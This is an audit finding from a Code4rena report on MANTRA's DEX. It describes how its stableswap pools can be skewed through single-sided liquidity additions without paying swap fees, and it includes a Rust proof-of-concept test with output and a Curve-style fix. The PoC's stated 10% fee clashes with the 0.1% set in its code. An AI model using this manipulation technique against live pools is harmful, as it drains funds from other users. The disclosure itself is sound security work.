---
tags:
  - lang/rust
  - lang/solidity
  - sector/bridge
  - sector/dex
  - sector/lending
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
protocol: "[[MANTRA]]"
auditors:
  - carrotsmuggler
report: "https://code4rena.com/reports/2024-11-mantra-dex"
genome:
  - "[[oracle-manipulation-resistance]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[direct-drain]]"
  - "[[trigger/price-manipulation]]"
---
# [H-08] Stableswap pool can be skewed free of fees

- id: 54984
- impact: HIGH
- protocol: MANTRA
- reporter: carrotsmuggler (Code4rena)
- source: https://code4rena.com/reports/2024-11-mantra-dex

## Summary


This bug report discusses a problem with the stableswap pools in the codebase. These pools are designed to maintain a specific price, but if the price deviates, they can incur large slippage. This is usually prevented by charging swap fees, but in this implementation, the fees are not being charged. This means that users can manipulate the pool price without paying any fees, which can lead to high slippage and loss of funds for other users. A proof of concept is provided to demonstrate this issue. The recommended solution is to add swap fees based on the skewness introduced during liquidity addition, similar to how it is done in Curve pools. 

## Details



[/contracts/pool-manager/src/liquidity/commands.rs# L257-L265](https://github.com/code-423n4/2024-11-mantra-dex/blob/26714ea59dab7ecfafca9db1138d60adcf513588/contracts/pool-manager/src/liquidity/commands.rs# L257-L265)

### Finding description and impact

Stableswap pools are designed to work around a set pricepoint. If the price of the pool deviates away from that point, the pool can incur large slippage.

Normally in constant product AMMs (CPMMs), slippage is observed at every point in the curve. However, for a user to change the price drastically, they need to do a large swap. This costs them swap fees. In CPMMs, adding liquidity does not change the price since they always have to be added at specific ratios.

For stableswaps, this is not true. In stableswap pools, liquidity can be added in at any ratio. This means that a user can add liquidity at a ratio far from the current price, which will change the ratio of funds in the pool, leading to large slippage for all users. Stableswap pools protect against this by using fees.

If we look at the curve protocol, we see that if liquidity is added at a ratio far from the current price, the `difference` between the liquidity addition price and ideal price is computed. The contract can be found [here](https://github.com/curvefi/stableswap-ng/blob/fd54b9a1a110d0e2e4f962583761d9e236b70967/contracts/main/CurveStableSwapNG.vy# L638-L654).
```

ideal_balance = D1 * old_balances[i] / D0
    difference = 0
    new_balance = new_balances[i]

    if ideal_balance > new_balance:
        difference = unsafe_sub(ideal_balance, new_balance)
    else:
        difference = unsafe_sub(new_balance, ideal_balance)
```

This basically is a measure of how much the pool is being skewed due to this liquidity addition. The user is then made to pay swap fees for this `skew` they introduced.
```

_dynamic_fee_i = self._dynamic_fee(xs, ys, base_fee)
fees.append(unsafe_div(_dynamic_fee_i * difference, FEE_DENOMINATOR))
self.admin_balances[i] += unsafe_div(fees[i] * admin_fee, FEE_DENOMINATOR)
new_balances[i] -= fees[i]
```

So, If a user adds liquidity at the current pool price, `difference` will be 0 and they wont be charged fees. But if they add liquidity at a skewed price, they will be charged a fee which is equal to the swap fee on the skew they introduced.

This basically makes them equivalent to CPMMs, where to change the price you need to pay swap fees. In stableswap pools like on curve, you pay swap fees if you change the price during liquidity addition.

The issue is that in the stableswap implementation in the codebase, this fee isn’t charged. So users skewing the stableswap pool can basically do it for free, pay no swap fees and only lose out on some slippage.
```

let d_0 = compute_d(amp_factor, old_pool_assets).ok_or(ContractError::StableInvariantError)?;
let d_1 = compute_d(amp_factor, new_pool_assets).ok_or(ContractError::StableInvariantError)?;

if d_1 <= d_0 {
    Ok(None)
} else {
    let amount = Uint512::from(pool_lp_token_total_supply)
        .checked_mul(d_1.checked_sub(d_0)?)?
        .checked_div(d_0)?;
    Ok(Some(Uint128::try_from(amount)?))
}
```

Here `new_pool_assets` is just `old_pool_assets`+`deposits`. So a user can add liquidity at any ratio, and not the penalty for it. This can be used by any user to manipulate the pool price or highly skew the pool composition.

Attached is a POC showing a user doing the same. This shows that the pools can be manipulated very easily at very low costs, and users are at risk of losing funds due to high slippage.

### Proof of Concept

In the following POC, the following steps take place:

1. A 2-token stableswap pool is created with `uwhale` and `uluna`.
2. `1e6` of each token is added as liquidity. This is `Liq addition` event.
3. A user adds `2e6` of `uwhale` and no `uluna`. This is `Liq addition 2`.
4. The user then removes the liquidity. This is `Liq removal`.

First let’s look at the output from the POC:
```

running 1 test
===Liq addition===
==Balance deltas==
uwhale delta: -1000000
uluna delta : -1000000
lp delta    : 1999000
==Balance deltas==

===Liq addition 2===
==Balance deltas==
uwhale delta: -2000000
lp delta    : 1993431
==Balance deltas==

===Liq Removal===
==Balance deltas==
uwhale delta: 1497532
uluna delta : 499177
lp delta    : -1993431
==Balance deltas==
```

Lets assume `uwhale` and `uluna` are both 1 USD each. In step 3, the user added `2e6` of `whale`, so added in `2e6` `usd`. In step 4, the user removed `1497532+499177=1996709 usd`. So the user recovered 99.84% of their funds. They only lost 0.16% to slippage.

In step 4 we see the impact. When the user removes liquidity, the liquidity comes out at a ratio of `1:0.33`. Thus, the pool is highly skewed and the price of the pool will be reported incorrectly and users will incur high slippage.

So at the cost of just 0.16% of their funds, the user was able to skew the pool by a massive amount. Even though the swap fees are 10% in the POC, the user was able to do this paying only 0.16%. This level of low-cost manipulation would be impossible even for CPMM pools, which are known to be more manipulatable than stableswap pools.

Below are some of the helper functions used in the POC:
```

fn print_diff(init_bal: [Uint128; 4], final_bal: [Uint128; 4]) -> [i128; 4] {
    let diffs = [
        final_bal[0].u128() as i128 - init_bal[0].u128() as i128,
        final_bal[1].u128() as i128 - init_bal[1].u128() as i128,
        final_bal[2].u128() as i128 - init_bal[2].u128() as i128,
        final_bal[3].u128() as i128 - init_bal[3].u128() as i128,
    ];

    println!("==Balance deltas==");
    if diffs[0] != 0 {
        println!("uwhale delta: {}", diffs[0]);
    }
    if diffs[1] != 0 {
        println!("uluna delta : {}", diffs[1]);
    }
    if diffs[2] != 0 {
        println!("uusd delta  : {}", diffs[2]);
    }
    if diffs[3] != 0 {
        println!("lp delta    : {}", diffs[3]);
    }
    println!("==Balance deltas==\n");

    diffs
}
fn calc_state(suite: &mut TestingSuite, creator: &str) -> [Uint128; 4] {
    let uwhale_balance = RefCell::new(Uint128::zero());
    let uluna_balance = RefCell::new(Uint128::zero());
    let uusd_balance = RefCell::new(Uint128::zero());
    let lp_shares = RefCell::new(Uint128::zero());

    suite.query_balance(&creator.to_string(), "uwhale".to_string(), |result| {
        *uwhale_balance.borrow_mut() = result.unwrap().amount;
    });

    suite.query_balance(&creator.to_string(), "uluna".to_string(), |result| {
        *uluna_balance.borrow_mut() = result.unwrap().amount;
    });

    suite.query_balance(&creator.to_string(), "uusd".to_string(), |result| {
        *uusd_balance.borrow_mut() = result.unwrap().amount;
    });

    suite.query_all_balances(&creator.to_string(), |balances| {
        for coin in balances.unwrap().iter() {
            if coin.denom.contains("o.whale.uluna.uusd") {
                *lp_shares.borrow_mut() = coin.amount;
            }
        }
    });

    let uwhale = *uwhale_balance.borrow();
    let uluna = *uluna_balance.borrow();
    let uusd = *uusd_balance.borrow();
    let lp = *lp_shares.borrow();
    [uwhale, uluna, uusd, lp]
}
```

Attached is the full POC code.
```

fn twopool_test() {
    let mut suite = TestingSuite::default_with_balances(
        vec![
            coin(1_000_000_001u128, "uwhale".to_string()),
            coin(1_000_000_000u128, "uluna".to_string()),
            coin(1_000_000_001u128, "uusd".to_string()),
            coin(1_000_000_001u128, "uom".to_string()),
        ],
        StargateMock::new("uom".to_string(), "8888".to_string()),
    );
    let creator = suite.creator();
    let _other = suite.senders[1].clone();
    let _unauthorized = suite.senders[2].clone();
    // Asset infos with uwhale and uluna

    let asset_infos = vec![
        "uwhale".to_string(),
        "uluna".to_string(),
    ];

    let pool_fees = PoolFee {
        protocol_fee: Fee {
            share: Decimal::zero(),
        },
        swap_fee: Fee {
            share: Decimal::from_ratio(1u128, 1000u128),
        },
        burn_fee: Fee {
            share: Decimal::zero(),
        },
        extra_fees: vec![],
    };

    // Create a pool
    suite.instantiate_default().create_pool(
        &creator,
        asset_infos,
        vec![6u8, 6u8],
        pool_fees,
        PoolType::StableSwap { amp: 100 },
        Some("whale.uluna.uusd".to_string()),
        vec![coin(1000, "uusd"), coin(8888, "uom")],
        |result| {
            result.unwrap();
        },
    );

    // Initial liquidity
    println!("===Liq addition===");
    let initial_balances = calc_state(&mut suite, &creator.to_string());
    suite.provide_liquidity(
        &creator,
        "o.whale.uluna.uusd".to_string(),
        None,
        None,
        None,
        None,
        vec![
            Coin {
                denom: "uwhale".to_string(),
                amount: Uint128::from(1_000_000u128),
            },
            Coin {
                denom: "uluna".to_string(),
                amount: Uint128::from(1_000_000u128),
            },
        ],
        |result| {
            result.unwrap();
        },
    );
    let final_balances = calc_state(&mut suite, &creator.to_string());
    let diffs = print_diff(initial_balances, final_balances);

    let lp_shares = RefCell::new(Coin::new(0u128, "".to_string()));
    suite.query_all_balances(&creator.to_string(), |balances| {
        for coin in balances.unwrap().iter() {
            if coin.denom.contains("o.whale.uluna.uusd") {
                *lp_shares.borrow_mut() = coin.clone();
            }
        }
    });

    //single sided liquidity
    println!("===Liq addition 2===");
    let initial_balances = calc_state(&mut suite, &creator.to_string());
    suite.provide_liquidity(
        &creator,
        "o.whale.uluna.uusd".to_string(),
        None,
        None,
        None,
        None,
        vec![
            Coin {
                denom: "uwhale".to_string(),
                amount: Uint128::from(2_000_000u128),
            },
            Coin {
                denom: "uluna".to_string(),
                amount: Uint128::from(0u128),
            },
        ],
        |result| {
            result.unwrap();
        },
    );
    let final_balances = calc_state(&mut suite, &creator.to_string());
    let diffs = print_diff(initial_balances, final_balances);

    println!("===Liq Removal===");
    let initial_balances = calc_state(&mut suite, &creator.to_string());
    suite.withdraw_liquidity(
        &creator,
        "o.whale.uluna.uusd".to_string(),
        vec![Coin {
            denom: lp_shares.borrow().denom.to_string(),
            amount: Uint128::from(diffs[3].max(0) as u128),
        }],
        |result| {
            result.unwrap();
        },
    );
    let final_balances = calc_state(&mut suite, &creator.to_string());
    print_diff(initial_balances, final_balances);
}
```

### Recommended mitigation steps

Similar to curve, add swap fees based on the skewness introduced in the stableswap pools during liquidity addition.

**jvr0x (MANTRA) confirmed**

---


